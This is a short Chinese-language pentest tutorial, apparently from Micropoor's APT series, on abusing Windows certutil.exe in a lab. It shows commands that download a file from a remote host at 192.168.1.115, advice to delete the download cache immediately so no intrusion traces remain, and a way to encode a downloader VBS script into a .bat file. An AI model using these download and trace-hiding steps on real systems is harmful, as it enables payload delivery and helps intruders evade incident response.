专注APT攻击与防御
https://micropoor.blogspot.com/

**certutil微软官方是这样对它解释的：**
Certutil.exe是一个命令行程序，作为证书服务的一部分安装。您可以使用Certutil.exe转储和显示证书颁发机构（CA）配置信息，配置证书服务，备份和还原CA组件以及验证证书，密钥对和证书链。
url:https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc732443(v=ws.11)

但是近些年好像被玩坏了。

靶机：windows 2003 windows 7

certutil.exe -urlcache -split -f http://192.168.1.115/robots.txt
![](media/d5ad3e478f8b4df59283786537e748f6.jpg)

默认下载为bin文件。但是不影响在命令行下使用。
![](media/346d182aad2fafe6b894d0b08c994e0e.jpg)

certutil.exe下载有个弊端，它的每一次下载都有留有缓存，而导致留下入侵痕迹，所以每次下载后，**需要马上执行如下**：

`certutil.exe -urlcache -split -f http://192.168.1.115/robots.txt delete`

![](media/1e7636c8225aaf3cd99d81bd44afeff9.jpg)

而在应急中certutil也是常用工具之一，来对比文件hash，来判断疑似文件。

**Windows 2003：**
![](media/4dd859482e45ae5632c0302798c69329.jpg)

**Windows 7：**
![](media/edec57e27ee820bc6c423481454ee6fc.jpg)

**certutil的其它高级应用：**
`C:\>certutil -encode c:\downfile.vbs downfile.bat`
![](media/cb14f787f5f65099047d739544e41dbc.jpg)

**file:downfile.bat**
![](media/b659cc22fd3ef3bc8931857f8a255c44.jpg)

**解密：**
![](media/bdb9cc7f59e382ddb3e607e704bea481.jpg)

**file:downfile.txt**
![](media/f0e6d3203cc514f0a7c611453246da1e.jpg)

**后者的话：**powershell内存加载配合certutil解密是一件非常有趣的事情。会在未来的系列中讲述。

>   Micropoor
